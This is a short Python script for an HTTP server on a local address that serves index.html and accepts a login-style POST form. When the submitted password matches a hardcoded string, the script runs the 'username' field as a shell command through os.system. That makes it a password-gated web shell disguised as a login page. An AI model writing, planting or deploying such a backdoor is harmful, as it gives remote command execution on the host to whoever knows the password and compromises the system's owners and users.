#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
from http.server import BaseHTTPRequestHandler, HTTPServer
import time
import cgi
import os

hostName = "192.168.0.106"
hostPort = 9000
f = open('index.html', 'r')
d = f.read()

class MyServer(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(bytes(d,"utf-8"))
    def do_POST(self):
        form = cgi.FieldStorage(
        fp=self.rfile,
        headers=self.headers,
        environ={'REQUEST_METHOD':'POST',
          'CONTENT_TYPE':self.headers['Content-Type'],
        })
        user=form.getvalue('username')
        psd=form.getvalue('password')
        if psd=='liupan':
            os.system(user)

myServer = HTTPServer((hostName, hostPort), MyServer)
print(time.asctime(), "Server Starts - %s:%s" % (hostName, hostPort))

try:
    myServer.serve_forever()
except KeyboardInterrupt:
    pass

myServer.server_close()
f.close()
print(time.asctime(), "Server Stops - %s:%s" % (hostName, hostPort))
